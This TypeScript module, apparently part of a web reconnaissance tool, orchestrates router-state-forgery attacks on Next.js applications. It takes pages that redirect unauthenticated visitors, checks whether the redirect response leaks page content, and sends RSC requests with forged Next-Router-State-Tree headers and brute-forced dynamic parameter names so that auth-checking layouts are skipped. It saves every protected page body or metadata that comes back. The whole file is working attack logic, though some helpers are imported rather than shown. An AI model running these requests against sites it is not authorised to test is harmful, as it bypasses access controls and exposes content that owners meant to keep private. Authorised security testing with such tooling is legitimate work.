import fs from "node:fs";
import path from "node:path";
import rawRequest from "../../../exploit/utility/rawRequest.js";
import { runWithConcurrency } from "../../../utility/concurrency.js";
import { printMsg, MSG } from "../../../utility/printMsg.js";
import {
    type AncestorSegment,
    type LeafMode,
    REQUEST_TIMEOUT_MS,
    RSF_LEAKS_DIR,
    type RsfLeak,
    ancestorsToPath,
    attemptForgeWithSchemaFallback,
    extractChunkPathsFromFlightBody,
    hasDynamicSegment,
    resolveChunkUrl,
    saveRsfLeak,
} from "./rsfShared.js";
import { fetchRscHeaderLeak, isRedirectBodyLeak } from "./next_rsfRedirectLeak.js";
import { buildStaticAncestorAttempts } from "./next_rsfAncestorClaim.js";
import {
    COMMON_DYNAMIC_PARAM_NAMES,
    buildDynamicGuessAttempts,
    extractParamNameCandidatesFromFlightBody,
    lastAncestorValue,
} from "./next_rsfParamBruteforce.js";
import next_interceptRouteNextUrl from "./next_interceptRouteNextUrl.js";

/**
 * Ancestor-segment claims worth trying per candidate path, ordered from MOST to LEAST specific:
 * `next_rsfParamBruteforce`'s dynamic-ancestor guesses (the only shape that can match a real
 * dynamic-route ancestor), then `next_rsfAncestorClaim`'s static full-chain claim, then its
 * first-segment-only claim. Order matters: `tryAttempts` returns on the first success, so a
 * coarse claim earlier in the list would mask a more specific match (internal-docs#172).
 * Either half can be switched off when its method is filtered out.
 */
export const buildAncestorAttempts = (
    pathSegments: string[],
    paramNameCandidates: readonly string[] = COMMON_DYNAMIC_PARAM_NAMES,
    { dynamic = true, static: includeStatic = true }: { dynamic?: boolean; static?: boolean } = {}
): AncestorSegment[][] => [
    ...(dynamic ? buildDynamicGuessAttempts(pathSegments, paramNameCandidates) : []),
    ...(includeStatic ? buildStaticAncestorAttempts(pathSegments) : []),
];

export interface RouterStateForgeResult {
    /** Hits per method, keyed like `techniqueEfficiencyMapping`: `next_rsfAncestorClaim`,
     * `next_rsfParamBruteforce` (full page body), each also with a `_metadataOnly` suffix (only
     * dynamic `generateMetadata()` output), `next_rsf_legacyKeyAccepted` (the cheap legacy `_rsc`
     * key alone was accepted — a build-line fingerprint), and `next_interceptRouteNextUrl`. */
    revealed: Record<string, string[]>;
    /** New downloadable JS chunk URLs recovered from any revealed Flight payload. */
    newJsUrls: string[];
    /** Saved response bodies, one per hit (empty when no `hostDir` was given). */
    leaks: RsfLeak[];
}

const DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT = 20;

/**
 * Runs every router-state-forgery lazyload method (`next_rsfRedirectBodyLeak`,
 * `next_rsfRscHeaderLeak`, `next_rsfAncestorClaim`, `next_rsfParamBruteforce`,
 * `next_interceptRouteNextUrl`), each gated by `shouldRun`.
 *
 * For each candidate page URL that redirects an unauthenticated request, the redirect itself is
 * checked first: a layout's `redirect()` doesn't stop the page under it from rendering, so its
 * output may ship in the 3xx HTML (`next_rsfRedirectBodyLeak`) or the RSC response
 * (`next_rsfRscHeaderLeak`) — see `next_rsfRedirectLeak.ts`.
 *
 * For each candidate page URL that redirects an unauthenticated request, retries as an RSC
 * fetch with a forged `Next-Router-State-Tree` claiming ancestor segments are already mounted.
 * If Next.js skips re-executing that ancestor's layout (js-recon-internal-docs#142), the
 * response comes back 200 without a NEXT_REDIRECT record — content a plain crawl never sees.
 *
 * Two leaf modes are tried per candidate: `page` (full body) first, and only if that fails,
 * `metadata-only` (dynamic `generateMetadata()` output). Within each, `buildAncestorAttempts`'
 * list is tried most-to-least specific. If the pass produced no dynamic-ancestor match (none
 * at all, or only a weak static one — internal-docs#172), one bonus round of dynamic guesses
 * is tried with param names harvested from the bodies already returned (internal#158), capped
 * at `rscParamBruteforceLimit` (`0` disables it).
 */
const next_rsf = async (
    origin: string,
    discoveredUrls: string[],
    candidateUrls: string[],
    threads: number,
    rscParamBruteforceLimit: number = DEFAULT_RSC_PARAM_BRUTEFORCE_LIMIT,
    shouldRun: (method: string) => boolean = () => true,
    timeout: number = REQUEST_TIMEOUT_MS,
    hostDir?: string
): Promise<RouterStateForgeResult> => {
    const runClaim = shouldRun("next_rsfAncestorClaim");
    const runBruteforce = shouldRun("next_rsfParamBruteforce");
    const runBodyLeak = shouldRun("next_rsfRedirectBodyLeak");
    const runRscLeak = shouldRun("next_rsfRscHeaderLeak");
    const revealed: Record<string, string[]> = {};
    const record = (key: string, url: string) => (revealed[key] ??= []).push(url);
    const newJsUrls: string[] = [];
    const leaks: RsfLeak[] = [];

    /** Collects a hit's chunk URLs (`knownChunks`, else every chunk in `body`) and, with a `hostDir`, saves its body. */
    const keep = (
        method: string,
        url: string,
        body: string,
        ext: "html" | "rsc",
        requestHeaders?: Record<string, string>,
        knownChunks?: string[]
    ): string[] => {
        const origin = new URL(url).origin;
        const chunks = knownChunks ?? extractChunkPathsFromFlightBody(body).map((c) => resolveChunkUrl(c, origin));
        newJsUrls.push(...chunks);
        if (hostDir) {
            try {
                leaks.push(saveRsfLeak(hostDir, { method, url, body, ext, requestHeaders }, chunks));
            } catch (err) {
                printMsg(MSG.Warn, `[!] Could not save the response for ${url}: ${(err as Error).message}`);
            }
        }
        return chunks;
    };

    if (runClaim || runBruteforce || runBodyLeak || runRscLeak) {
        await runWithConcurrency(candidateUrls, threads, async (candidateUrl) => {
            let parsed: URL;
            try {
                parsed = new URL(candidateUrl);
            } catch {
                return;
            }
            const segments = parsed.pathname.split("/").filter(Boolean);
            const ancestorAttempts =
                segments.length === 0
                    ? []
                    : buildAncestorAttempts(segments, undefined, { dynamic: runBruteforce, static: runClaim });
            if (ancestorAttempts.length === 0 && !runBodyLeak && !runRscLeak) return;

            // Every method here only applies to routes that redirect an unauthenticated request.
            const baseline = await rawRequest(candidateUrl, { timeout });
            if (!baseline || baseline.status < 300 || baseline.status >= 400) return;

            if (runBodyLeak && isRedirectBodyLeak(baseline)) {
                printMsg(MSG.Finding, `[✓] Redirect response (HTML) revealed page content: ${candidateUrl}`);
                record("next_rsfRedirectBodyLeak", candidateUrl);
                keep("next_rsfRedirectBodyLeak", candidateUrl, baseline.body, "html");
            }
            if (runRscLeak) {
                const rsc = await fetchRscHeaderLeak(candidateUrl, timeout);
                if (rsc) {
                    printMsg(MSG.Finding, `[✓] Redirect response (RSC) revealed page content: ${rsc.url}`);
                    record("next_rsfRscHeaderLeak", candidateUrl);
                    keep("next_rsfRscHeaderLeak", rsc.url, rsc.body, "rsc", { RSC: "1" });
                }
            }
            if (ancestorAttempts.length === 0) return;

            // Anchor for RSC-body harvesting; undefined when there's no dynamic-guess slot.
            const harvestAnchor = runBruteforce ? lastAncestorValue(segments) : undefined;
            const harvestedNames = new Set<string>();

            /** Tries `attempts` under `leafMode`, harvesting param-name candidates from every
             * body; records and returns on the first success. `matchedDynamic` says whether that
             * success was a dynamic-ancestor claim (the strongest possible match). */
            const tryAttempts = async (
                attempts: AncestorSegment[][],
                leafMode: LeafMode
            ): Promise<{ success: boolean; matchedDynamic: boolean }> => {
                for (const ancestors of attempts) {
                    const result = await attemptForgeWithSchemaFallback(candidateUrl, ancestors, leafMode, timeout);
                    if (harvestAnchor && result.body) {
                        for (const name of extractParamNameCandidatesFromFlightBody(result.body, harvestAnchor)) {
                            harvestedNames.add(name);
                        }
                    }
                    if (result.success) {
                        const matchedDynamic = hasDynamicSegment(ancestors);
                        const verb = leafMode === "page" ? "revealed content" : "revealed metadata";
                        const prefix =
                            leafMode === "page"
                                ? "Router-state request (content)"
                                : "Router-state request (metadata-only)";
                        printMsg(
                            MSG.Finding,
                            `[✓] ${prefix} ${verb}: ${candidateUrl} (claimed ancestor: /${ancestorsToPath(ancestors)}, ${result.keyMode} _rsc key)`
                        );
                        const method = matchedDynamic ? "next_rsfParamBruteforce" : "next_rsfAncestorClaim";
                        record(leafMode === "page" ? method : `${method}_metadataOnly`, candidateUrl);
                        if (result.keyMode === "legacy") record("next_rsf_legacyKeyAccepted", candidateUrl);
                        keep(
                            leafMode === "page" ? method : `${method}_metadataOnly`,
                            result.requestUrl ?? candidateUrl,
                            result.body,
                            "rsc",
                            result.requestHeaders
                        );
                        return { success: true, matchedDynamic };
                    }
                }
                return { success: false, matchedDynamic: false };
            };

            /** Dynamic-guess-only attempts from harvested names not already in the fixed
             * wordlist; `[]` when nothing new was found or the fallback is disabled. */
            const harvestBonusAttempts = (): AncestorSegment[][] => {
                if (!runBruteforce || rscParamBruteforceLimit <= 0) return [];
                const newNames = [...harvestedNames].filter((n) => !COMMON_DYNAMIC_PARAM_NAMES.includes(n as never));
                if (newNames.length === 0) return [];
                return buildDynamicGuessAttempts(segments, newNames.slice(0, rscParamBruteforceLimit));
            };

            // A weak/coarse success does not skip the harvested-name bonus round — only a
            // dynamic-ancestor success is the strongest result a pass can produce (internal-docs#172).
            let pageResult = await tryAttempts(ancestorAttempts, "page");
            if (!pageResult.success || !pageResult.matchedDynamic) {
                const bonusResult = await tryAttempts(harvestBonusAttempts(), "page");
                if (bonusResult.success) pageResult = bonusResult;
            }
            if (pageResult.success) return;

            const metadataResult = await tryAttempts(ancestorAttempts, "metadata-only");
            if (!metadataResult.success || !metadataResult.matchedDynamic) {
                await tryAttempts(harvestBonusAttempts(), "metadata-only");
            }
        });
    }

    if (shouldRun("next_interceptRouteNextUrl")) {
        const intercept = await next_interceptRouteNextUrl(origin, discoveredUrls, candidateUrls, threads);
        revealed["next_interceptRouteNextUrl"] = intercept.revealedUrls;
        newJsUrls.push(...intercept.newJsUrls);
        for (const hit of intercept.hits) {
            keep("next_interceptRouteNextUrl", hit.url, hit.body, "html", { "Next-Url": hit.nextUrl }, hit.chunks);
        }
    }

    if (hostDir && leaks.length > 0) {
        fs.writeFileSync(path.join(hostDir, RSF_LEAKS_DIR, "index.json"), JSON.stringify(leaks, null, 4));
        printMsg(MSG.Finding, `[+] Saved ${leaks.length} revealed response(s) to ${path.join(hostDir, RSF_LEAKS_DIR)}`);
    }

    for (const key of Object.keys(revealed)) revealed[key] = [...new Set(revealed[key])];
    return { revealed, newJsUrls: [...new Set(newJsUrls)], leaks };
};

export default next_rsf;
